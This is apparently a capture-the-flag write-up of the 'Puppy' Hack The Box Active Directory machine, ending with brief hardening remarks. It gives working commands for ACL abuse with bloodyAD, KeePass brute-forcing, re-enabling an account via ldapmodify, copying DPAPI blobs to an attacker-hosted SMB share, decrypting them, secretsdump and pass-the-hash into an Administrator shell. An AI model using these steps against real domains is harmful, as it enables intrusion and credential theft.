---
title: Puppy
categories: [Active Directory, HTB]
tags: [Windows, AD, medium, privilege-escalation]
image: images/Puppy/Puppy.png
---
# 1. Overview

 **Poppy** is an Active Directory-style Windows domain compromise that demonstrates a chained AD attack: starting from given low-privileged credentials, we enumerate the domain, abuse weak **delegation/write** permissions to escalate privileges, recover secrets from stored files **(KeePass / DPAPI)**, and finally obtain a Domain Administrator shell via credential extraction. 

# 2. Goal

Demonstrate a complete AD compromise starting from provided user credentials.

Show enumeration techniques (RPC/LDAP/SMB), abuse of AD permissions, credential extraction, and final domain takeover.

Provide clear, repeatable commands and remediation suggestions.

# 3. Initial Access

As is common in real-world/CTF scenarios, the box was started with the following valid user credentials:

```creds
User: levi.james
Password: KingofAkron2025!
```

We begin by using **RPC/SMB** and **LDAP** enumeration tools to discover available services and domain objects. The initial nmap/service discovery and the starting rpcclient session are included in the provided transcript. 



# 4. Reconnaissance & Enumeration
Nmap / Service discovery

Nmap output reveals many AD-related services (LDAP, Kerberos, SMB, RPC, NFS hints). Key open ports from the transcript include: 53, 88, 111, 135, 139, 389 (LDAP), 445 (SMB), 3268 (Global Catalog), 5985 (WinRM/HTTP), and many RPC high ports â€” consistent with a Windows Domain Controller. This guided subsequent LDAP and SMB enumeration. 


SMB and Domain User Enumeration

Using **rpcclient** with the provided credentials we enumerated domain users (Administrator, Guest, krbtgt, levi.james, ant.edwards, adam.silver, jamie.williams, steph.cooper, steph.cooper_adm). This confirmed the domain and gave a list of candidate accounts we could target. 


Commands (excerpt):
`rpcclient puppy.htb -U levi.james`

Evidence: enumdomusers results in the transcript. 

SMB Shares

Using an SMB enumeration helper, we enumerated accessible shares and observed **DEV**, **NETLOGON**, **SYSVOL**, and admin shares (ADMIN$, C$). Initially **DEV** was readable for **levi.james**. 


# 5. Privilege Escalation via AD Group/Writes (Abuse of Delegation)

While enumerating AD with BloodHound and related tooling, we discovered privilege relationships that we could abuse:

- **levi.james** is a member of HR.

**HR** has a **GenericWrite** (or similar write) permission to the **DEVELOPERS** group â€” this allowed adding **levi.james** to **DEVELOPERS**. After adding the user to **DEVELOPERS**, read access to the **DEV** share became available. 

```bash
Key commands used:

bloodhound-python -u levi.james -p 'KingofAkron2025!' -d puppy.htb -ns 10.10.11.70 -c All --zip
# Analyze BloodHound results to find HR -> DEVELOPERS write path

bloodyAD --host '10.10.11.70' -d 'dc.puppy.htb' -u 'levi.james' -p 'KingofAkron2025!' add groupMember DEVELOPERS levi.james
```

After the group change, **DEV** share moved from writable/not-readable to readable for our user â€” enabling retrieval of additional artifacts. 


>[!Note]
>This step demonstrates how abusive ACLs and overly-broad group write permissions can be turned into a privilege escalation path.

# 6. Secrets Discovery: KeePass Database & Password Recovery

Inside the now-readable **DEV** area (or files available to **levi.james**) we found a KeePass **.kdbx** file named **recovery.kdbx**. A dictionary attack with **keepass4brute** (rockyou wordlist) revealed the master password **liverpool**. The database contents contained multiple credentials (e.g., **JamieLove2025!**, **HJKL2025!**, **Antman2025!**, **Steve2025!**, **ILY2025!**) that we tried against domain services. 

Commands (excerpt):
```bash
bash ~/tools/keepass4brute.sh recovery.kdbx ~/tools/rockyou.txt
# Password found: liverpool
# Open recovery.kdbx with keepassxc to extract stored passwords
```

Using those passwords, we successfully authenticated as **ant.edwards** with **Antman2025!**. 

# 7. Lateral Movement / Foothold Attempts

We attempted to use **evil-winrm** to access the host as **ant.edwards**. The initial attempt failed due to WinRM authorization (could be session restrictions / WinRM policies). But with the credentials in hand we moved on to use AD abuse techniques identified by BloodHound. 


>[!Important]
>LDAP query and **ldapmodify** were used to enable/adjust accounts later in the chain (see below). The transcript shows we found **adam.silver** account was present but disabled (userAccountControl indicated not enabled). We changed **userAccountControl** to enable the account and then used the set password operation to set a known password (**Passwd123!**) for **adam.silver**. This enabled direct login as **adam.silver**. 

Commands (excerpt):
```bash
ldapsearch -x -H ldap://puppy.htb -D "ANT.EDWARDS@PUPPY.HTB" -W -b "DC=puppy,DC=htb" "(sAMAccountName=ADAM.SILVER)"
# Then enable:
ldapmodify -x -H ldap://puppy.htb -D "ANT.EDWARDS@PUPPY.HTB" -W << EOF
dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
changetype: modify
replace: userAccountControl
userAccountControl: 66048
EOF
```

After enabling and resetting, **evil-winrm** successfully connected as **adam.silver**. 

# 8. Escalation via DPAPI / Credential Material

From **adam.silver**'s context we discovered further sensitive artifacts (a **site-backup-2024-12-30.zip** and web application files). The puppy web app directory contained **nms-auth-config.xml.bak** which included cleartext LDAP bind credentials **steph.cooper:ChefSteph2025!**. These credentials were crucial to progress toward domain admin. 

Command excerpt showing config content:
```xml
<bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
<bind-password>ChefSteph2025!</bind-password>
```

This allowed us to authenticate as **steph.cooper** against **LDAP/AD**. 

Next, we accessed DPAPI and credential storage for **steph.cooper**:

We located DPAPI blobs / Credential files and copied them off the host by hosting an SMB share with **impacket-smbserver** and using **copy** on the remote host to push blobs to our attacker share. 

Using **impacket-dpapi masterkey** with the **ChefSteph2025!** password and the appropriate SID, we decrypted the masterkey and subsequently recovered an enterprise credential for **steph.cooper_adm** (**FivethChipOnItsWay2025!**). 

Commands (excerpt):
```bash
impacket-smbserver share ./share -smb2support
# On host: copy credential blobs to \\<attacker-ip>\share\

impacket-dpapi masterkey -file masterkey_blob -password 'ChefSteph2025!' -sid S-1-5-21-...
impacket-dpapi credential -file credential_blob -key 0x<decrypted_key>
# Output: Username: steph.cooper_adm, Password: FivethChipOnItsWay2025!
```
# 9. Domain Administrator: Final Privilege Escalation & Domain Compromise

With **steph.cooper_adm** credentials (**FivethChipOnItsWay2025!**) we authenticated as an administrative user. From that context we could either:

- Directly **evil-winrm** into the **Administrator** account by extracting the Administrator NTLM/NT hash via **impacket-secretsdump** (the transcript shows secretsdump and extraction of the Administrator hash **bb0edc15...**), and then authenticating with **evil-winrm -H <hash>** to obtain an Administrator shell
                            OR
- Use the steph.cooper_adm context to run high-privilege operations and access the filesystem to obtain root.txt (root/Administrator flag).

The transcript confirms the use of **impacket-secretsdump** to extract domain hashes and subsequently **evil-winrm** using the Administrator hash to obtain an Administrator shell. Evidence: Administrator hash extracted and **evil-winrm** succeeded. 
```bash
Commands (excerpt):

impacket-secretsdump 'puppy.htb/steph.cooper_adm:FivethChipOnItsWay2025!'@10.10.11.70
# Extracted Administrator hash: bb0edc15..
evil-winrm -i puppy.htb -u 'Administrator' -H 'bb0edc15ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜'
# Result: Administrator shell
```
# 10. Conclusion


Poppy is an excellent demonstration of an AD attack chain where weak ACLs, exposed configuration secrets, and recoverable credential stores can be combined to escalate from a low-privileged user to Domain Administrator. The compromise was entirely possible due to (a) excessive AD write privileges, (b) plaintext secrets in repository/backup files, and (c) recoverable DPAPI artifacts. Hardening these areas and increasing detection around the described behaviors would significantly raise the attack difficulty.